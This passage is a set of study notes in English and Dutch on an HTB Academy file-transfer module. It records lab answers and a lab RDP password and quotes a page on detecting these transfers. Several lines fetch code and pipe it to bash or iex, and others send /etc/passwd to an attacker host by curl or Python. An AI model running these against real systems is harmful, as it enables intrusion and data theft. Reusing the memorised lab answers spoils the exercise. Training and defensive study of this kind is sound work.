```bash
htb-student@nix04:/tmp$ hasher upload_nix.txt
159cfe5c65054bbadb2761cfa359c8b0
```

**Technical Notes:**

- `hasher` is in PATH (`/usr/bin/`), so no `./` prefix needed
- Output is a 32-character hexadecimal hash (MD5 format)
- Different from Windows hash despite identical input file

### Result

✅ **Success**  
**Answer:** `159cfe5c65054bbadb2761cfa359c8b0`  
**Verification:** Hash accepted by HTB Academy platform

---

## 📊 Command Reference Sheet

### Kali Linux (Attack Machine) Commands

bash

```bash
# ============================================
# RECONNAISSANCE
# ============================================

# Ping sweep
ping -c 3 <target_ip>

# Port scan
nmap <target_ip>
nmap -sV <target_ip>                    # Service version detection

# ============================================
# PYTHON HTTP DOWNLOADS
# ============================================

# Method 1: urllib (one-liner, direct output)
python3 -c 'import urllib.request; print(urllib.request.urlopen("http://<ip>/file.txt").read().decode())'

# Method 2: urllib (download to file)
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<ip>/file.txt', 'output.txt')"

# Method 3: requests module
python3 -c "import requests; print(requests.get('http://<ip>/file.txt').text)"

# ============================================
# SCP (SECURE COPY)
# ============================================

# Upload file to remote host
scp <local_file> <user>@<ip>:<remote_path>
scp upload_nix.zip htb-student@10.129.234.168:/tmp/

# Download file from remote host
scp <user>@<ip>:<remote_file> <local_path>
scp htb-student@10.129.234.168:/tmp/file.txt ~/Downloads/

# Upload entire directory (recursive)
scp -r <local_dir> <user>@<ip>:<remote_path>

# ============================================
# SSH CONNECTION
# ============================================

# Basic SSH connection
ssh <user>@<ip>

# SSH with specific port
ssh -p <port> <user>@<ip>

# SSH with key file
ssh -i <keyfile> <user>@<ip>

# ============================================
# ALTERNATIVE DOWNLOAD METHODS
# ============================================

# wget
wget http://<ip>/file.txt
wget -O output.txt http://<ip>/file.txt    # Custom output name

# curl
curl http://<ip>/file.txt
curl -o output.txt http://<ip>/file.txt    # Save to file
```

---

### Linux Target Commands

bash

```bash
# ============================================
# NAVIGATION & FILE INSPECTION
# ============================================

# Navigate to directory
cd /tmp
cd ~                                    # Home directory
cd -                                    # Previous directory

# List files
ls -la                                  # Long format, show hidden
ls -lh                                  # Human-readable sizes
ls -lt                                  # Sort by modification time

# Check file details
file <filename>                         # Determine file type
stat <filename>                         # Detailed file stats

# ============================================
# ZIP EXTRACTION METHODS
# ============================================

# Standard unzip (if available)
unzip <file.zip>
unzip -l <file.zip>                     # List contents without extracting

# Python zipfile module
python3 -m zipfile -e <file.zip> .      # Extract to current dir
python3 -m zipfile -l <file.zip>        # List contents

# Alternative: tar (if file is .tar.gz)
tar -xzf <file.tar.gz>
tar -xvzf <file.tar.gz>                 # Verbose output

# ============================================
# FILE SEARCH & DISCOVERY
# ============================================

# Find files by name
find / -name <filename> 2>/dev/null
find /usr -name <filename> 2>/dev/null  # Search specific directory
find . -name "*.txt"                    # Wildcard search

# Locate command (faster, uses database)
locate <filename>
updatedb                                # Update locate database (requires root)

# Which (find executable in PATH)
which <command>

# Whereis (find binary, source, manual)
whereis <command>

# ============================================
# FILE TRANSFER (FROM TARGET)
# ============================================

# Base64 encoding for copy-paste transfer
cat <file> | base64 -w 0; echo

# Start simple HTTP server (Python3)
python3 -m http.server 8000

# Start simple HTTP server (Python2)
python2.7 -m SimpleHTTPServer 8000

# PHP web server
php -S 0.0.0.0:8000

# Ruby web server
ruby -run -ehttpd . -p8000

# ============================================
# DOWNLOAD FROM WEB (ON TARGET)
# ============================================

# wget
wget http://<attack_ip>:8000/file.txt
wget -qO- http://<ip>/file.txt | bash   # Fileless execution

# curl
curl http://<attack_ip>:8000/file.txt -o file.txt
curl http://<ip>/script.sh | bash      # Fileless execution

# Python download
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<ip>/file', 'output')"

# Bash /dev/tcp (if wget/curl unavailable)
exec 3<>/dev/tcp/<ip>/80
echo -e "GET /file.txt HTTP/1.1\n\n">&3
cat <&3

# ============================================
# HASHING & VERIFICATION
# ============================================

# MD5 hash
md5sum <file>

# SHA256 hash
sha256sum <file>

# Compare hashes
md5sum <file> | awk '{print $1}'        # Extract just hash

# ============================================
# PERMISSIONS & EXECUTION
# ============================================

# Make file executable
chmod +x <file>

# Execute binary/script
./<filename>                            # Current directory
/path/to/<filename>                     # Absolute path

# Check if file is executable
test -x <file> && echo "Executable" || echo "Not executable"
```

---

## 🔐 Security Analysis

### Offensive Perspective (Red Team)

|Technique|Stealth Level|Detection Risk|Use Case|
|---|---|---|---|
|**Python urllib**|🟢 High|Low|Standard HTTP traffic, blends in|
|**SCP/SSH**|🟢 High|Low|Encrypted, legitimate admin traffic|
|**Python zipfile**|🟢 High|None|Local operation, no network trace|
|**Living Off The Land**|🟢 High|Very Low|Uses pre-installed tools, no uploads|

**Key Advantages:**

1. **No malware upload needed** - Hasher already present
2. **Encrypted transport** - SCP uses SSH encryption
3. **Minimal footprint** - Only 194-byte ZIP uploaded
4. **Standard protocols** - HTTP/SSH unlikely to trigger alerts

---

### Defensive Perspective (Blue Team)

**Detection Opportunities:**

bash

```bash
# Monitor SCP/SSH file transfers
tail -f /var/log/auth.log | grep scp

# Track Python execution
auditctl -w /usr/bin/python3 -p x -k python_exec

# Monitor /tmp directory writes
inotifywait -m /tmp -e create,modify

# Check for suspicious hasher executions
grep hasher /var/log/syslog
ps aux | grep hasher
```

**Red Flags in This Scenario:**

1. SCP upload to `/tmp/` (common staging area)
2. Python zipfile extraction (unusual for regular users)
3. Hasher execution on unknown file
4. User from external IP (10.10.x.x range)

---

## 📚 Lessons Learned & Best Practices

### Technical Insights

1. **Python is Universal**
    - Present on almost all Linux distributions
    - Can replace missing tools (unzip, wget, etc.)
    - Useful for one-liners and fileless operations
2. **Living Off The Land (LOLBAS/GTFOBins)**
    - Always search for pre-installed tools before uploading
    - Reduces network traffic and detection risk
    - Common locations: `/usr/bin/`, `/usr/local/bin/`, `/opt/`
3. **SCP vs HTTP Upload**
    - SCP: Encrypted, requires SSH access, more stealthy
    - HTTP: Easier to set up, works through more firewalls
    - Choose based on network restrictions
4. **Error Suppression in Find**
    - `2>/dev/null` is essential to avoid permission error spam
    - Makes output readable
    - Useful in scripts and one-liners

---

### Comparison: Linux vs Windows File Transfers

|Aspect|Linux|Windows|
|---|---|---|
|**Primary Protocol**|SSH/SCP|SMB/RDP|
|**CLI Download**|wget, curl|Invoke-WebRequest (iwr)|
|**Extraction**|unzip, tar|Expand-Archive|
|**Encoding**|base64|[Convert]::ToBase64String|
|**File Search**|find|Get-ChildItem -Recurse|
|**Default Tools**|Python, perl, ruby often pre-installed|PowerShell built-in|
|**Package Manager**|apt, yum, dnf|chocolatey (optional)|

---

### Troubleshooting Guide

|Problem|Cause|Solution|
|---|---|---|
|`unzip: command not found`|Tool not installed|Use `python3 -m zipfile -e file.zip .`|
|`Permission denied` during apt install|Non-root user|Find alternative method or ask admin|
|`scp: No such file`|Wrong local path|Check with `ls`, use absolute path|
|`find` output cluttered|Permission errors|Add `2>/dev/null` to command|
|Hash doesn't match|Wrong tool/method|Verify with `which hasher`, check file integrity|

---

## 🎓 OSCP/CPTS Exam Relevance

### Why This Matters for Certifications

**OSCP (Offensive Security Certified Professional):**

- File transfers are essential during post-exploitation
- SCP often required to exfiltrate proof.txt files
- Python one-liners commonly used in restricted shells
- Living Off The Land reduces artifact footprint

**CPTS (Certified Penetration Testing Specialist):**

- Demonstrates understanding of Linux internals
- Shows ability to adapt when standard tools unavailable
- File transfer skills tested in multiple modules
- Real-world scenario simulation

---

### Exam-Ready Commands

**Quick Reference for Time-Sensitive Situations:**

bash

```bash
# Fast flag grab (Python)
python3 -c 'import urllib.request; print(urllib.request.urlopen("http://TARGET/flag.txt").read().decode())'

# Fast file upload (SCP)
scp proof.txt user@YOUR_IP:/tmp/

# Emergency extraction (no unzip)
python3 -m zipfile -e file.zip .

# Find tools (Living Off The Land)
find / -name nc 2>/dev/null              # netcat
find / -name python* 2>/dev/null         # python
which gcc                                 # compiler
```

---

## 🏆 Module Completion Status

### Questions Answered

|#|Question|Answer|Points|Status|
|---|---|---|---|---|
|1|Download flag.txt with Python|`5d21cf3da9c0ccb94f709e2559f3ea50`|+2|✅|
|2|Upload ZIP & run hasher|`159cfe5c65054bbadb2761cfa359c8b0`|+3|✅|
|3|Practice file transfers|`DONE`|N/A|✅|

**Streak Bonus:** +10 points for completing section without hints

---

### Skills Demonstrated

- ✅ HTTP downloads via Python
- ✅ SCP file uploads over SSH
- ✅ Problem-solving when standard tools unavailable
- ✅ Python module usage (zipfile)
- ✅ Living Off The Land binary discovery
- ✅ Linux command-line proficiency
- ✅ Error suppression techniques
- ✅ File integrity verification

---

## 🔄 Alternative Methods (For Practice)

### Methods NOT Used But Worth Knowing

#### 1. **Netcat File Transfer**

**On Kali (listener):**

bash

```bash
nc -lvnp 4444 > received_file.zip
```

**On Target:**

bash

```bash
nc <KALI_IP> 4444 < upload_nix.zip
```

#### 2. **Base64 Encoding (No Network)**

**On Target:**

bash

```bash
cat upload_nix.txt | base64 -w 0
# Copy output, paste on Kali:
echo "<base64_string>" | base64 -d > file.txt
```

#### 3. **Wget Upload (Requires uploadserver)**

**On Kali:**

bash

```bash
python3 -m pip install uploadserver
python3 -m uploadserver 8000
```

**On Target:**

bash

```bash
curl -X POST http://<KALI_IP>:8000/upload -F 'files=@/tmp/file.txt'
```

#### 4. **SFTP (Interactive)**

bash

```bash
sftp htb-student@10.129.234.168
put upload_nix.zip /tmp/
get /tmp/output.txt
```

#### 5. **Rsync (Efficient for Large Files)**

bash

```bash
rsync -avz upload_nix.zip htb-student@10.129.234.168:/tmp/
```

---

## 📖 References & Further Reading

- [HTB Academy - File Transfers Module](https://academy.hackthebox.com/module/24)
- [GTFOBins - Living Off The Land](https://gtfobins.github.io/)
- [Python zipfile Documentation](https://docs.python.org/3/library/zipfile.html)
- [OpenSSH SCP Documentation](https://man.openbsd.org/scp)
- [Linux Find Command Guide](https://man7.org/linux/man-pages/man1/find.1.html)

---

## 🎯 Next Steps

**Completed Sections:**

- ✅ Windows File Transfer Methods
- ✅ Linux File Transfer Methods

**Remaining Sections:**

- 📝 Transferring Files with Code (Python/PHP/Ruby scripts)
- 🌐 Miscellaneous File Transfer Methods (Netcat, RDP clipboard)
- 🦅 Living off The Land (Deep dive into LOLBAS & GTFOBins)
- 🔍 Detect or Be Detected (Detection & evasion)

---

## 🔚 Conclusion

Deze Linux file transfer oefening demonstreerde de veelzijdigheid van Linux command-line tools. De grootste uitdaging - het ontbreken van `unzip` - werd opgelost door Python's ingebouwde zipfile module te gebruiken, wat een belangrijke les is: **altijd meerdere methoden kennen om hetzelfde doel te bereiken**.

Het vinden van de pre-geïnstalleerde `hasher` tool in `/usr/bin/` bevestigde de "Living Off The Land" strategie die ook succesvol was in de Windows module. Deze aanpak is cruciaal voor stealthy operations en wordt vaak toegepast in real-world penetration tests.

**Key Takeaways:**

1. Python is je Swiss Army knife op Linux
2. SCP is de betrouwbaarste encrypted file transfer method
3. Always search for pre-installed tools before uploading
4. `2>/dev/null` maakt je leven makkelijker
5. Know multiple methods - restrictions vary per environment

---

**Lab Completed:** ✅ 27 januari 2026  
**Time Spent:** ~45 minuten  
**Difficulty Rating:** ⭐⭐☆☆☆ (2/5 - Beginner/Intermediate)  
**Status:** Ready for next section

Je bent nu bij de sectie **"Transferring Files with Code"**. Dit is een cruciaal onderdeel voor situaties waarin standaard tools zoals `wget` of `curl` niet aanwezig zijn of worden geblokkeerd door beveiligingssoftware.

Hier is de vertaling en de praktische samenvatting van de belangrijkste methoden die je in je **Obsidian** kunt zetten.

---

## 💻 Bestandsoverdracht met Code (Samenvatting)

Vaak zijn programmeertalen zoals Python, PHP, Perl of Ruby standaard geïnstalleerd. We kunnen deze talen gebruiken om "oneliners" (één regel code) uit te voeren die bestanden downloaden of uploaden.

### 1. Python Downloads

Python is bijna altijd aanwezig op Linux.

- **Python 3:**
    
    Bash
    
    ```
    python3 -c 'import urllib.request;urllib.request.urlretrieve("URL", "bestandsnaam")'
    ```
    

### 2. PHP Downloads

PHP wordt door meer dan 77% van de websites gebruikt. Je kunt het direct vanaf de opdrachtregel aanroepen met `-r`.

- **Bestand opslaan:**
    
    Bash
    
    ```
    php -r '$file = file_get_contents("URL"); file_put_contents("naam",$file);'
    ```
    
- **Fileless (direct naar Bash sturen):**
    
    Bash
    
    ```
    php -r '$lines = @file("URL"); foreach ($lines as $line) { echo $line; }' | bash
    ```
    

### 3. Windows Scripting (JavaScript & VBScript)

Op Windows kun je `cscript.exe` gebruiken om scripts uit te voeren die bestanden downloaden. Dit omzeilt vaak beperkingen die op browsers of PowerShell liggen.

- **JavaScript:** `cscript.exe /nologo wget.js URL output`
    
- **VBScript:** `cscript.exe /nologo wget.vbs URL output`
    

### 4. Uploaden met Python 3

Als je een bestand van de target naar je eigen machine wilt sturen:

1. Start de server op je Kali: `python3 -m uploadserver`
    
2. Stuur het bestand vanaf de target:
    
    Bash
    
    ```
    python3 -c 'import requests;requests.post("http://KALI_IP:8000/upload",files={"files":open("/etc/passwd","rb")})'
    ```
    

---

## 🛠 Oefening: Praktijk op de Target

Voor de **Optional Exercise** wordt er van je gevraagd om deze programmeertalen te oefenen op je huidige target (`10.129.234.168`).

### Wat je nu moet doen:

Je bent al ingelogd via SSH. Probeer een van de bovenstaande methoden uit om bijvoorbeeld een klein testbestandje van je Kali naar de `/tmp` map van de target te sturen met PHP of Python.

**Zodra je dit hebt geoefend:**

1. Ga naar het invulveld op de HTB Academy pagina.
    
2. Typ: **`DONE`**
    
3. Klik op **Submit**.
    

---

### 📝 Obsidian Rapport Aanvulling: "Code-Based Transfers"

Markdown

```
## ⌨️ Code-Based Transfers

### Python 3 (Download)
`python3 -c 'import urllib.request;urllib.request.urlretrieve("http://IP/file", "outfile")'`

### PHP (Download)
`php -r '$f=file_get_contents("http://IP/file");file_put_contents("outfile",$f);'`

### Ruby (Download)
`ruby -e 'require "net/http"; File.write("outfile", Net::HTTP.get(URI.parse("http://IP/file")))'`

### Perl (Download)
`perl -e 'use LWP::Simple; getstore("http://IP/file", "outfile");'`
```

Lekker bezig, je gaat als een speer door die secties heen! 🚀

Je bent nu bij de sectie **"Miscellaneous File Transfer Methods"**. Deze gaat over de creatieve en minder voor de hand liggende manieren om bestanden te verplaatsen als de standaardpoorten (zoals 80, 443 of 22) potdicht zitten.

Hier is de samenvatting voor je **Obsidian** van de technieken die in deze sectie worden behandeld:

---

## 📂 Miscellaneous File Transfer Methods

Soms moet je buiten de gebaande paden treden. Hier zijn drie "alternatieve" manieren:

### 1. Netcat (De "Swiss Army Knife")

Netcat is perfect voor snelle overdrachten, maar let op: het verkeer is **niet versleuteld**.

- **Download naar Target:**
    
    - _Target (Ontvanger):_ `nc -l -p 8000 > bestand.txt`
        
    - _Kali (Zender):_ `nc -w 3 [TARGET_IP] 8000 < bestand.txt`
        
- **Upload naar Kali:**
    
    - _Kali (Ontvanger):_ `nc -l -p 8000 > geupload.txt`
        
    - _Target (Zender):_ `nc [KALI_IP] 8000 < bestand_om_te_sturen.txt`
        

### 2. PowerShell Sessions (WinRM)

Als je WinRM toegang hebt (poort 5985), kun je bestanden overzetten binnen een bestaande PowerShell-sessie. Dit is erg stealthy omdat het over een vertrouwd beheerprotocol gaat.

- **Sessie aanmaken:**
    
    PowerShell
    
    ```
    $sess = New-PSSession -ComputerName [TARGET_IP] -Credential $cred
    ```
    
- **Bestand kopiëren:**
    
    PowerShell
    
    ```
    Copy-Item -Path "C:\temp\payload.exe" -ToSession $sess -Destination "C:\Users\Public\"
    ```
    

### 3. SMB (Impacket-smbserver)

Op Windows is SMB de meest natuurlijke manier. Je kunt je Kali-machine laten doen alsof het een Windows-netwerkschijf is.

- **Op Kali:**
    
    Bash
    
    ```
    sudo impacket-smbserver share -smb2support .
    ```
    
- **Op Windows Target:**
    
    DOS
    
    ```
    copy \\KALI_IP\share\bestand.exe C:\temp\
    ```
    

---

## 🛠 Wat moet je nu doen?

Voor de opdracht die je nu in je scherm hebt staan:

1. **Spawn de target** (als de oude is verlopen).
    
2. **Verbind via SSH** (of RDP, afhankelijk van de machine).
    
3. **Oefen** met één van de bovenstaande methoden (bijvoorbeeld Netcat, omdat dat heel snel gaat op Linux).
    

**Netcat Oefening:**

1. Open een terminal op je Kali en typ: `nc -l -p 4444`
    
2. Typ in je SSH-sessie op de target: `echo "Dit is een test" > test.txt && nc [JOUW_KALI_IP] 4444 < test.txt`
    
3. Kijk op je Kali of de tekst verschijnt.
Je bent nu bij een heel belangrijk ethisch en technisch onderdeel: **Protected File Transfers**.

Als hacker (of penetration tester) kom je vaak gevoelige data tegen (zoals wachtwoorden of klantgegevens). Het is jouw verantwoordelijkheid om deze data te beschermen tijdens het transport. Als je data onbeveiligd verstuurt en een derde partij vangt dit op, ben jij verantwoordelijk voor het datalek.

Hier is de samenvatting voor je **Obsidian** en de vertaling naar de praktijk.

---

## 🔐 Protected File Transfers (Beveiligde Overdracht)

Wanneer HTTPS of SSH niet beschikbaar zijn, moet je bestanden **handmatig versleutelen** voordat je ze verstuurt. Dit proces wordt vaak "stagen" van data genoemd.

### 1. Windows: PowerShell (Invoke-AESEncryption)

Op Windows kun je een PowerShell-script gebruiken om AES-256 encryptie toe te passen. AES is een sterke symmetrische versleuteling.

**Hoe je het gebruikt:**

1. **Importeer het script:** `Import-Module .\Invoke-AESEncryption.ps1`
    
2. **Versleutel een bestand:** `Invoke-AESEncryption -Mode Encrypt -Key "JeWachtwoord" -Path .\geheim.txt` _Dit maakt een bestand aan genaamd `geheim.txt.aes`._
    
3. **Ontsleutel het bestand:** `Invoke-AESEncryption -Mode Decrypt -Key "JeWachtwoord" -Path .\geheim.txt.aes`
    

### 2. Linux: OpenSSL

Op Linux is `openssl` de standaard tool. Het is bijna op elke server aanwezig.

**Bestand versleutelen:**

Bash

```
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

- `-aes256`: Het algoritme.
    
- `-iter 100000`: Maakt het brute-forcen van het wachtwoord veel moeilijker.
    
- `-pbkdf2`: Een moderne methode om een sleutel van je wachtwoord af te leiden.
    

**Bestand ontsleutelen:**

Bash

```
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

---

## ⚠️ Belangrijke Ethische Noot

In de tekst wordt gewaarschuwd: **Exfiltreer nooit echte gevoelige data** (zoals creditcardnummers) tenzij de klant hier expliciet om heeft gevraagd voor een test. Gebruik liever "dummy data" om aan te tonen dat je de beveiliging kunt omzeilen.

---

## 📝 Obsidian Rapport Aanvulling: "Data Protection"

Markdown

```
## 🔒 Data Protection & Encryption

### Windows (PowerShell AES)
- **Script:** `Invoke-AESEncryption.ps1`
- **Encrypt:** `Invoke-AESEncryption -Mode Encrypt -Key "p@ss" -Path file.txt`
- **Decrypt:** `Invoke-AESEncryption -Mode Decrypt -Key "p@ss" -Path file.txt.aes`

### Linux (OpenSSL)
- **Encrypt:** `openssl enc -aes256 -iter 100000 -pbkdf2 -in file.txt -out file.enc`
- **Decrypt:** `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in file.enc -out file.txt`

> **Tip:** Gebruik altijd `-pbkdf2` en een hoog aantal iteraties (`-iter`) om te voldoen aan moderne veiligheidsstandaarden.
```

---

### Volgende stap

Er is voor deze specifieke pagina geen interactieve opdracht (geen "Submit" knop onderaan), maar het is raadzaam om even te oefenen met `openssl` op je eigen Kali machine zodat je de syntax in je vingers krijgt.

Je bent nu bij de sectie **"Catching Files over HTTP/S"**. In de vorige hoofdstukken leerde je hoe je bestanden _verstuurt_, maar nu leer je hoe je je eigen aanvalsmachine (Kali/Pwnbox) klaarmaakt om die bestanden te _ontvangen_.

Het belangrijkste leerpunt hier: **Nginx gebruiken met de PUT-methode.**

---

## 🌐 Waarom Nginx voor Exfiltratie?

Wanneer je data steelt (exfiltreert) van een target, wil je dat via een protocol doen dat bijna altijd is toegestaan: **HTTP/HTTPS**.

- **Voordeel:** Het lijkt op normaal webverkeer.
    
- **Nginx vs Apache:** Nginx is veiliger voor jou als aanvalsmachine. Apache voert soms per ongeluk geüploade PHP-scripts uit (web shells), waardoor je eigen machine gehackt kan worden. Nginx doet dit niet standaard.
    

---

## 🛠 Nginx Instellen voor Uploads

Hier is de snelle checklist voor je **Obsidian** om een "geheime" upload-map te maken op poort 9001:

1. **Map maken en rechten geven:**
    
    Bash
    
    ```
    sudo mkdir -p /var/www/uploads/SecretUploadDirectory
    sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
    ```
    
2. **Configuratie aanmaken (`/etc/nginx/sites-available/upload.conf`):**
    
    Nginx
    
    ```
    server {
        listen 9001;
        location /SecretUploadDirectory/ {
            root    /var/www/uploads;
            dav_methods PUT; # Dit staat uploads toe
        }
    }
    ```
    
3. **Activeren en Herstarten:**
    
    Bash
    
    ```
    sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
    sudo rm /etc/nginx/sites-enabled/default # Voorkom poort-conflicten
    sudo systemctl restart nginx.service
    ```
    

---

## 🚀 Testen vanaf de Target

Zodra je server draait, kun je vanaf de gecompromitteerde machine (het target) bestanden naar jezelf sturen met `curl`.

**Het commando:**

Bash

```
curl -T /etc/passwd http://<JOUW_IP>:9001/SecretUploadDirectory/users.txt
```

- `-T`: Staat voor "Transfer", dit gebruikt de **PUT** methode.
    
- De inhoud van `/etc/passwd` wordt nu op jouw Kali opgeslagen als `users.txt`.
    

---

## 📝 Obsidian Rapport Aanvulling: "HTTP Upload Lab"

Markdown

```
## 📤 Catching Files (Nginx PUT)

### Server Setup (Kali)
1. Config in `/etc/nginx/sites-available/upload.conf` met `dav_methods PUT;`.
2. Zorg dat `www-data` eigenaar is van de doeltarget-map.
3. Luister op een niet-standaard poort (bijv. 9001) om detectie te vermijden.

### Client Upload (Target)
`curl -T <file_to_send> http://<attacker_ip>:<port>/<dir>/<new_name>`

> **Security Tip:** Nginx laat standaard geen directory listing zien. Dit is goed! Zo kan niemand zien welke bestanden je al hebt geëxfiltreerd door naar je IP te surfen.
```

Dit is een van de belangrijkste concepten in modern offensief security-werk: **Living off the Land (LotL)**. Het idee is simpel: waarom zou je malware of tools uploaden die door de antivirus (AV) worden herkend, als het besturingssysteem zelf al krachtige tools heeft die je kunt misbruiken?

Hier is de kern van wat je moet weten voor je **Obsidian** en de stappen voor de opdracht.

---

## 🏗️ Living off the Land (LotL)

Aanvallers gebruiken **LOLBins** (voor Windows) en **GTFOBins** (voor Linux). Dit zijn legitieme programma's die bedoeld zijn voor systeembeheer, maar die ook bestanden kunnen downloaden, uploaden of commando's kunnen uitvoeren.

### 1. Belangrijke Windows LOLBins

- **Certutil.exe:** Eigenlijk bedoeld voor certificaten, maar de "de-facto wget voor Windows".
    
    - _Download:_ `certutil.exe -urlcache -split -f http://10.10.10.10/nc.exe nc.exe`
        
- **Bitsadmin.exe:** Gebruikt de Background Intelligent Transfer Service. Zeer discreet omdat het downloads op de achtergrond kan doen.
    
    - _Download:_ `bitsadmin /transfer job /priority foreground http://10.10.10.10/file.exe C:\temp\file.exe`
        
- **CertReq.exe:** Kan worden gebruikt om bestanden te uploaden via een HTTP POST-verzoek naar je Kali-luisteraar.
    

### 2. Belangrijke Linux GTFOBins

- **OpenSSL:** Kan fungeren als een versleutelde Netcat-kloon voor bestandsoverdracht.
    
- **Python/PHP/Perl:** Zoals we eerder zagen, ideaal voor oneliners.
    

---

## 🚀 De Opdracht: Oefenen op 10.129.1.82

Je moet verbinding maken via RDP en een LotL-techniek gebruiken om een bestand over te zetten.

### Stap 1: Verbinden via RDP

Gebruik `xfreerdp` vanaf je Kali-machine:

Bash

```
xfreerdp /v:10.129.1.82 /u:htb-student /p:HTB_@cademy_stdnt!
```

### Stap 2: Probeer de "Certutil" Download

Open een opdrachtprompt (CMD) op de Windows-machine en probeer een bestand van je Kali te downloaden.

1. **Op je Kali:** Start een Python webserver in de map waar een testbestand staat.
    
    Bash
    
    ```
    python3 -m http.server 8000
    ```
    
2. **Op de Windows Target (CMD):**
    
    DOS
    
    ```
    certutil.exe -urlcache -split -f http://<JOUW_KALI_IP>:8000/test.txt C:\Users\htb-student\Desktop\test.txt
    ```
    

---

## 📝 Obsidian Rapport Aanvulling: "LOLBins & GTFOBins"

Markdown

```
## 🛠️ Living off the Land (LotL)

### Handige Bronnen
- [LOLBAS Project](https://lolbas-project.github.io/) (Windows)
- [GTFOBins](https://gtfobins.github.io/) (Linux)

### Windows Favorieten
| Tool | Actie | Commando |
| :--- | :--- | :--- |
| **Certutil** | Download | `certutil.exe -urlcache -split -f http://IP/file out` |
| **Bitsadmin** | Download | `bitsadmin /transfer wcb /priority foreground http://IP/file C:\out` |
| **CertReq** | Upload | `certreq.exe -Post -config http://IP:PORT/ C:\windows\win.ini` |

### Linux Favorieten
| Tool | Actie | Commando |
| :--- | :--- | :--- |
| **OpenSSL** | Download | `openssl s_client -connect IP:PORT -quiet > file` |
```

**Heb je een van deze technieken succesvol uitgevoerd?** Zodra je een bestand hebt overgezet met een LotL-tool, kun je **DONE** typen in het invulveld.

_Let op: `certutil` wordt tegenwoordig vaak door Windows Defender geblokkeerd of gesignaleerd. Als het niet werkt, probeer dan de `Bitsadmin` methode!_

Dashboard

  

Modules

  

Paths

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

File Transfers

  

  

Page 9

Detection

  

  

  

  

  

  

Detection

Command-line detection based on blacklisting is straightforward to

bypass, even using simple case obfuscation. However, although the

process of whitelisting all command lines in a particular environment is

initially time-consuming, it is very robust and allows for quick

detection and alerting on any unusual command lines.

Most client-server protocols require the client and server to

negotiate how content will be delivered before exchanging information.

This is common with the HTTP protocol. There is a need for

interoperability amongst different web servers and web browser types to

ensure that users have the same experience no matter their browser. HTTP

clients are most readily recognized by their user agent string, which

the server uses to identify which HTTP client is connecting to it, for example, Firefox, Chrome, etc.

User agents are not only used to identify web browsers, but anything acting as an HTTP client and connecting to a web server via HTTP can have a user agent string (i.e., cURL, a custom Python script, or common tools such as sqlmap, or Nmap).

Organizations can take some steps to identify potential user agent

strings by first building a list of known legitimate user agent strings,

user agents used by default operating system processes, common user

agents used by update services such as Windows Update, and antivirus

updates, etc. These can be fed into a SIEM tool used for threat hunting

to filter out legitimate traffic and focus on anomalies that may

indicate suspicious behavior. Any suspicious-looking user agent strings

can then be further investigated to determine whether they were used to

perform malicious actions. This website is handy for identifying common user agent strings. A list of user agent strings is available here.

Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common HTTP transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).

  

Invoke-WebRequest - Client

  

Detection

  

  

PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"

PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"

  

Invoke-WebRequest - Server

  

Detection

  

  

GET /nc.exe HTTP/1.1

User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0

  

WinHttpRequest - Client

  

Detection

  

  

PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);PS C:\htb> $h.send();PS C:\htb> iex $h.ResponseText

  

WinHttpRequest - Server

  

Detection

  

  

GET /nc.exe HTTP/1.1

Connection: Keep-Alive

Accept: */*

User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)

  

Msxml2 - Client

  

Detection

  

  

PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);PS C:\htb> $h.send();PS C:\htb> iex $h.responseText

  

Msxml2 - Server

  

Detection

  

  

GET /nc.exe HTTP/1.1

Accept: */*

Accept-Language: en-us

UA-CPU: AMD64

Accept-Encoding: gzip, deflate

User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)

  

Certutil - Client

  

Detection

  

  

C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe

C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe

  

Certutil - Server

  

Detection

  

  

GET /nc.exe HTTP/1.1

Cache-Control: no-cache

Connection: Keep-Alive

Pragma: no-cache

Accept: */*

User-Agent: Microsoft-CryptoAPI/10.0

  

BITS - Client

  

Detection

  

  

PS C:\htb> Import-Module bitstransfer;PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;PS C:\htb> $r=gc $env:temp\t;PS C:\htb> rm $env:temp\t; PS C:\htb> iex $r

  

BITS - Server

  

Detection

  

  

HEAD /nc.exe HTTP/1.1

Connection: Keep-Alive

Accept: */*

Accept-Encoding: identity

User-Agent: Microsoft BITS/7.8

This section just scratches the surface on detecting malicious file

transfers. It would be an excellent start for any organization to create

a whitelist of allowed binaries or a blacklist of binaries known to be

used for malicious purposes. Furthermore, hunting for anomalous user

agent strings can be an excellent way to catch an attack in progress. We

will cover threat hunting and detection techniques in-depth in later

modules.

  

  

  

  

  

+10 Streak pts

  

  

  

  

Table of Contents

  

Introduction

File Transfer Methods

Detect or Be Detected

My Workstation

  

OFFLINE

  

  

  

  

  

/ 1 spawns left

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

Powered by  

Je bent nu bij de **Blue Team** kant van het verhaal: **Detection**. Als aanvalster is het cruciaal om te begrijpen hoe verdedigers (SOC-analisten) jouw acties zien. Als je weet hoe ze je detecteren, kun je leren hoe je onder de radar blijft.

